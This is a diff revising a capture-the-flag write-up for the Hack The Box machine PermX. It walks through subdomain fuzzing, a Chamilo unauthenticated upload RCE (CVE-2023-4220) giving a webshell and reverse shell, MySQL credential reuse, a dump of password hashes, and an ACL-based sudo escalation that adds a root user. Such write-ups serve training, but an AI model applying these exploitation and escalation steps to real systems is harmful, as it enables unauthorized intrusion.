@@ -5,10 +5,19 @@ tags:
   - htb
   - linux
   - easy
+  - ffuf
+  - subdomain-bruteforce
+  - chamilo
+  - mysql
+  - sudoers
+  - bcrypt
+  - acl
 ---
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/PermX.png)
 
-## Information Gathering
+## Rustscan
+
+Rustscan find SSH and HTTP running:
 
 `rustscan --addresses permx.htb --range 1-65535`
 
@@ -17,116 +26,115 @@ tags:
 ## Enumeration
 ### HTTP - TCP 80
 
+There's nothing special about `permx.htb`. Several forms are there, but not exploitable:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image.png)
+
+Feroxbuster discovers bunch of new directories but none of them seem very interesting:
 
 `feroxbuster -u http://permx.htb`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-2.png)
 
-potential usernames:
+Potential username is discovered. Let's see if this will come handy later:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-3.png)
 
+Enumerating the subdomain using `ffuf`, `www.permx.htb` and `lms.permx.htb` are found:
 
 `ffuf -u http://10.10.11.23 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.permx.htb' -fw 18`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-4.png)
 
-edit `/etc/hosts` again
+Let's edit `/etc/hosts` to add the above.
 
 ### lms.permx.htb
 
+`lms.permx.htb` is running Chamilo 1.0 login page:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-5.png)
 
-
-admin name:
+On the bottom right side of the page, admin name is shown:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-6.png)
 
 ## Exploitation
 
-chamilo 1 exploit:
+Googling for Chamilo 1.0 exploit, it seems like I can attempt on RCE:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-7.png)
 
-cve-2023-4220
+### CVE-2023-4220
 
-[here](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc)
+Let's first the exploit git repository from [here](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc).
 
 `git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-8.png)
 
-Scanning to check the vulnerability:
+After everything is setup properly, scan to check the vulnerability. Exploit confirms the vulnerability:
 
 `sudo python3 main.py -u http://lms.permx.htb -a scan`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-9.png)
 
+There are two options.
+
+First, I can spawn a webshell as such:
 
 `sudo python3 main.py -u http://lms.permx.htb -a webshell`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-11.png)
 
+I can send in commands through the webshell like below:
 
 `http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=whoami`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-10.png)
 
-Reverse Shell
+I can spawn a reverse shell as well:
 
 `sudo python3 main.py -u http://lms.permx.htb -a revshell`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-12.png)
 
+After inputting correct IP address and listening port, we get a shell as `www-data`:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-13.png)
 
 ## Privesc: www-data to mtz
 
+It seems like `user.txt` is inside `mtz` user folder so we have to go escalate our privilege:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-14.png)
 
-Transfer linpeas using Python http server and wget.
+### Chamilo Conf
 
-/etc/mysql/mariadb.cnf
-
-/var/www/chamilo
-
-
-
-
--rwxr-xr-x 1 www-data www-data 2603 Aug 31  2023 /var/www/chamilo/main/extra/database.php
--rwxr-xr-x 1 www-data www-data 34969 Aug 31  2023 /var/www/chamilo/plugin/buycourses/database.php
-    $paypalTable->addColumn('password', Types::STRING);
-        'password' => '',
--rwxr-xr-x 1 www-data www-data 3157 Aug 31  2023 /var/www/chamilo/plugin/customcertificate/database.php
--rwxr-xr-x 1 www-data www-data 1943 Aug 31  2023 /var/www/chamilo/plugin/notebookteacher/database.php
--rwxr-xr-x 1 www-data www-data 29829 Aug 31  2023 /var/www/chamilo/plugin/sepe/database.php
-
-/usr/share/keyrings/ubuntu-archive-removed-keys.gp
-
-/var/www/chamilo/web.config
-
- /etc/skel/.profile
-
-/var/www/chamilo/app/config/configuration.php
+Looking into `/var/www/chamilo/app/config/configuration.php`, credentials for MySQL is revealed:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-15.png)
 
-03F6lY3uXAP2bkW8
-
-MySQL port open:
+MySQL is running on port 3306 locally:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-16.png)
 
-mysql -u chamilo -p03F6lY3uXAP2bkW8 -e "SHOW DATABASES;"
+### MySQL
+
+Let's list databases:
+
+`mysql -u chamilo -p03F6lY3uXAP2bkW8 -e "SHOW DATABASES;"`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-17.png)
 
-mysql -u chamilo -p03F6lY3uXAP2bkW8 -e "SHOW TABLES;" chamilo
+Since `chamilo` database seems interesting, I will list tables in it:
+
+`mysql -u chamilo -p03F6lY3uXAP2bkW8 -e "SHOW TABLES;" chamilo`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-18.png)
 
-mysql -u chamilo -p03F6lY3uXAP2bkW8 -e "SELECT * FROM user;" chamilo
+Dumping `user` table information, I get password hashes:
+
+`mysql -u chamilo -p03F6lY3uXAP2bkW8 -e "SELECT * FROM user;" chamilo`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-19.png)
 
@@ -135,52 +143,32 @@ mysql -u chamilo -p03F6lY3uXAP2bkW8 -e "SELECT * FROM user;" chamilo
 | admin    | admin              | admin@permx.htb        | $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra           | awb0kMoTumbFvi22ojwv.Pg92gFTMOt837kWsGVbJN4 |
 | anon     | anon               | anonymous@example.com  | $2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS           | Mr1pyTT.C/oEIPb/7ezOdrCDKM.KHb0nrXAUyIyt/MY |
 
-Remove any leading or trailing whitespace
-sed -i 's/^[ \t]*//;s/[ \t]*$//' hash
+Before cracking bcrypt hash, I will remove any leading or trailing whitespace:
 
-hashcat -m 3200 hash ~/Downloads/rockyou.txt
+`sed -i 's/^[ \t]*//;s/[ \t]*$//' hash`
 
+I tried cracking the hash, but it failed using rockyou.txt:
+
+`hashcat -m 3200 hash ~/Downloads/rockyou.txt`
+
+Turns out there was no need to crack the password and user `mtz`was using the password for the MySQL login. I can ssh in as user `mtz`:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-20.png)
 
 ## Privesc: mtz to root
 ### sudoers
-/opt/acl.sh
+
+Running `sudo -l`, `/opt/acl.sh` could be ran as `sudo` without needing any password:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-21.png)
 
+Let's take a look at `acl.sh`:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-22.png)
 
-```bash
-#!/bin/bash
+`/opt/acl.sh`, is designed to modify the access control list (ACL) of a specified file using the `setfacl` command. ACLs allow you to set more granular file permissions than the standard Unix file permissions.
 
-if [ "$#" -ne 3 ]; then
-    /usr/bin/echo "Usage: $0 user perm file"
-    exit 1
-fi
-
-user="$1"
-perm="$2"
-target="$3"
-
-if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
-    /usr/bin/echo "Access denied."
-    exit 1
-fi
-
-# Check if the path is a file
-if [ ! -f "$target" ]; then
-    /usr/bin/echo "Target must be a file."
-    exit 1
-fi
-
-/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
-```
-
-echo "cat /root/root.txt" > /home/mtz/root.sh
-chmod +x /home/mtz/root.sh
-
-sudo /opt/acl.sh <user> <permissions> /home/mtz/root.sh
+Below script performs several actions, primarily aimed at exploiting the ACL modification to gain unauthorized access by adding a new user with root privileges:
 
 ```bash
 #!/bin/bash
@@ -201,16 +189,9 @@ rm /home/mtz/passwd
 su new
 ```
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-24.png)
+Running the script, we get a shell as the new root user and we can read `root.txt`:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-23.png)
-
-
-
-
-
-
-
 
 
 ## References
